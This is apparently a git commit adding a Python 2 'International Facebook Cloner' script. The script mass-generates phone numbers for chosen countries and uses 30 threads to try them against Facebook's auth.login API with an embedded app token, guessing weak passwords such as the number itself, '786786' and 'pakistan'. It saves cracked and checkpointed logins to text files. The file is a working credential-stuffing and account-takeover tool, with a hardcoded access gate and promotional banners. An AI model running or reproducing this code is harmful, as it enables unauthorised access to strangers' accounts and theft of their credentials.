79332b0a993f3fee94a99b20da51cc486f0de7b4
Farhan <66604627+wahidfarhan@users.noreply.github.com>
2020-11-02 18:27:07 +0600

    Add files via upload

---
+++ all.py
@@ -0,0 +1,289 @@
+import os,time
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+import time,os,sys,mechanize,requests,random,os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+os.system('clear')
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+os.system('rm -rf .txt')
+print u"\u001b[38;5;46m" + "Wait Until All Pckages Are Loading.........."
+for n in range(99999):
+    nmbr = random.randint(1111111, 9999999)
+
+    sys.stdout = open('.txt', 'a')
+
+    print(nmbr)
+
+    sys.stdout.flush()
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent',
+                  'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def banners():
+    print u"\u001b[38;5;45m"+55*"="
+    print u"\u001b[38;5;39m"+"    ____             __         ____"
+    print u"\u001b[38;5;38m"+"   / __ \____ ______/ /__      / __ \____ _____ ____"
+    print u"\u001b[38;5;37m"+"  / / / / __ `/ ___/ /../_____/ /_/ / __ `/ __ `/ _ \."
+    print u"\u001b[38;5;36m"+" / /_/ / /_/ / /  / ,<|/_____/ _, _/ /_/ / /_/ /  __/"
+    print u"\u001b[38;5;35m"+"/_____/\__,_/_/  /_/|_|     /_/ |_|\__,_/\__, /\___/"
+    print u"\u001b[38;5;34m"+"                                        /____/ \033[1;96mCoder: Farhan"
+    print u"\u001b[38;5;160m"+"         International Facebook Cloner"
+    print u"\u001b[38;5;45m"+55*"="
+    print u"\u001b[38;5;190m"+"AUTHOR    : DARKNETHAXOR"
+    print u"\u001b[38;5;191m"+"FACEBOOK  : FACEBOOK.COM/DARKNETHAXOR"
+    print u"\u001b[38;5;192m"+"YOUTUBE   : YOUTUBE.COM/DARKNETHAXOR"
+    print u"\u001b[38;5;193m"+"GITHUB    : FACEBOOK.COM/FARHAN"
+    print u"\u001b[38;5;46m" + 55 * "-"
+
+
+def logger():
+    os.system('clear')
+    banners()
+    CorrectUsername = "darknethaxor"
+    CorrectPassword = "nightrage"
+    loop = 'true'
+    while (loop == 'true'):
+        username = raw_input('\nUSERNAME: ')
+        if (username == CorrectUsername):
+            password = raw_input('\nPASSWORD: ')
+            if (password == CorrectPassword):
+                print("\nAPPROVED!")
+                time.sleep(1)
+                loop = 'false'
+            else:
+                print("wrong password")
+                os.system('xdg-open https://www.facebook.com/groups/1546183828897889')
+                os.system('clear')
+                banners()
+        else:
+            print("wrong username")
+            os.system('xdg-open https://www.facebook.com/groups/1546183828897889')
+            os.system('clear')
+            banners()
+    os.system('clear')
+logger()
+def choser():
+    print u"\u001b[38;5;99m" + 55 * "="
+    print u"\u001b[38;5;196m"+"     \     |  |       ___|  | "
+    print u"\u001b[38;5;197m"+"    _ \    |  |      |      |   _ \   __ \    _ \   __| "
+    print u"\u001b[38;5;198m"+"   ___ \   |  |      |      |  (   |  |   |   __/  |    "
+    print u"\u001b[38;5;199m"+" _/    _\ _| _|     \____| _| \___/  _|  _| \___| _|    "
+    print u"\u001b[38;5;99m" + 55 * "="
+    print u"\u001b[38;5;221m" +"[1] INDIA"
+    print u"\u001b[38;5;222m" +"[2] USA"
+    print u"\u001b[38;5;223m" +"[3] UK"
+    print u"\u001b[38;5;224m" +"[4] FRANCE"
+    print u"\u001b[38;5;225m" +"[5] ITALY"
+    print u"\u001b[38;5;226m" +"[6] PAKISTAN"
+    print u"\u001b[38;5;227m" +"[7] BRAZIL"
+    print u"\u001b[38;5;228m" +"[8] SRI LANKA\n"
+    action()
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+def action():
+    value = str(raw_input(u"\u001b[38;5;51m" + "Chose Your Country: "))
+    if value == '1':
+        os.system('clear')
+        banners()
+        print("ONLY INDIAN ACCOUNT ARE AVAILABLE\n")
+        print("\033[1;93m905, 975, 755, 855, 954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578\n")
+        print('[0]  \033[1;95m\nExit            ')
+        print(50 * '-')
+        countrycode='+91'
+    elif value == '2':
+        os.system('clear')
+        banners()
+        print("ONLY USA ACCOUNT ARE AVAILABLE\n")
+        print("\033[1;93m555,786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708\n")
+        countrycode = '+1'
+    elif value == '3':
+        os.system('clear')
+        banners()
+        print("ONLY UK ACCOUNT ARE AVAILABLE\n")
+        print("\033[1;93m715,785,765,725,745,735,737, 706, 748, 783, 739, 759, 790\n")
+        countrycode='+44'
+    elif value == '4':
+        os.system('clear')
+        banners()
+        print("ONLY FRANCE ACCOUNT ARE AVAILABLE\n")
+        print("\033[1;93mWrite the remaining digits here.65, 70, 73, 74, 76, 77\n")
+        countrycode='+33'
+    elif value == '5':
+        os.system('clear')
+        banners()
+        print("ONLY ITALY ACCOUNT ARE AVAILABLE\n")
+        print("\033[1;93m311,323,385,388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328\n")
+        countrycode='+39'
+    elif value =='6':
+        os.system('clear')
+        banners()
+        print("ONLY PAKISTAN ACCOUNT ARE AVAILABLE\n")
+        print("\033[1;93m01, ~to~~, 49\n")
+        countrycode='03'
+    elif value =='7':
+        os.system('clear')
+        banners()
+        print("ONLY BRAZIL ACCOUNT ARE AVAILABLE\n")
+        print("\033[1;93m127, 179, 117, 853, 318, 219, 834, 186, 479, 113\n")
+        countrycode='+55'
+    elif value=='8':
+        os.system('clear')
+        banners()
+        print("ONLY SRI LANKA ACCOUNT ARE AVAILABLE\n")
+        print("\033[1;93mWrite the remaining digits here.71,72,73,74,75,76,77,78")
+        countrycode='+94'
+    c = raw_input(" choose code  : ")
+    k = countrycode
+    idlist = ('.txt')
+    for line in open(idlist, "r").readlines():
+        id.append(line.strip())
+
+    xxx = str(len(id))
+    psb(u"\u001b[38;5;190m"+"[+]Total 99999 Number Has Beed generated.........")
+    time.sleep(0.5)
+    psb(u"\u001b[38;5;190m"+"[+]Please wait, process is running ...")
+    time.sleep(0.5)
+    psb(u"\u001b[38;5;190m"+'[!] To Stop Process Press CTRL Then Press z')
+    time.sleep(0.5)
+    psb(50*'-')
+    time.sleep(0.5)
+    print
+    50 * '-'
+    print
+
+    def main(arg):
+        global cpb, oks
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+        try:
+            pass1 = user
+            data = br.open(
+                'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print('\x1b[1;92m[Successful]\x1b[0m '+ k + c + user + ' | ' + pass1 + '\n' + "\n" )
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '|' + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            else:
+                if 'www.facebook.com' in q['error_msg']:
+                    print('\x1b[1;96m[Checkpoint]\x1b[0m '+ k + c + user + ' | ' + pass1 + '\x1b[1;96m[Open After 7 Days]\x1b[0m \n')
+                    cps = open('save/checkpoint.txt', 'a')
+                    cps.write(k + c + user + '|' + pass1 + '\n')
+                    cps.close()
+                    cpb.append(c + user + pass1)
+                else:
+                    result = k + c + user
+                    digi8 = result[5:13]
+                    pass1 = digi8
+                    data = br.open(
+                        'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print('\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + "\n")
+                        okb = open('save/successfull.txt', 'a')
+                        okb.write(k + c + user + '|' + pass1 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass1)
+                    else:
+                        if 'www.facebook.com' in q['error_msg']:
+                            print('\x1b[1;96m[Checkpoint]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;96m[Open After 7 Days]\x1b[0m \n')
+                            cps = open('save/checkpoint.txt', 'a')
+                            cps.write(k + c + user + '|' + pass1 + '\n')
+                            cps.close()
+                            cpb.append(c + user + pass1)
+                        else:
+                            pass1 = '786786'
+                            data = br.open(
+                                'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print('\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + "\n")
+                                okb = open('save/successfull.txt', 'a')
+                                okb.write(k + c + user + '|' + pass1 + '\n')
+                                okb.close()
+                                oks.append(c + user + pass1)
+                            else:
+                                if 'www.facebook.com' in q['error_msg']:
+                                    print(
+                                                '\x1b[1;96m[Checkpoint]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;96m[Open After 7 Days]\x1b[0m \n')
+                                    cps = open('save/checkpoint.txt', 'a')
+                                    cps.write(k + c + user + '|' + pass1 + '\n')
+                                    cps.close()
+                                    cpb.append(c + user + pass1)
+                                else:
+                                    if value=='1' or value=='6':
+                                        pass1 = 'pakistan'
+                                        data = br.open(
+                                            'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                        q = json.load(data)
+                                        if 'access_token' in q:
+                                            print(
+                                                    '\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + "\n")
+                                            okb = open('save/successfull.txt', 'a')
+                                            okb.write(k + c + user + '|' + pass1 + '\n')
+                                            okb.close()
+                                            oks.append(c + user + pass1)
+                                        else:
+                                            if 'www.facebook.com' in q['error_msg']:
+                                                print(
+                                                        '\x1b[1;96m[Checkpoint]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;96m[Open After 7 Days]\x1b[0m \n')
+                                                cps = open('save/checkpoint.txt', 'a')
+                                                cps.write(k + c + user + '|' + pass1 + '\n')
+                                                cps.close()
+                                                cpb.append(c + user + pass1)
+
+
+
+
+
+
+
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print
+    50 * '-'
+    print
+    '[+] Process Has Been Completed....'
+    print
+    '[+] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
+    print('[+] CP File Has Been Saved : save/checkpoint.txt')
+    raw_input('\n[Press Enter To Go Back]')
+    os.system('python2 darkall.py')
+
+
+if __name__ == '__main__':
+    choser()
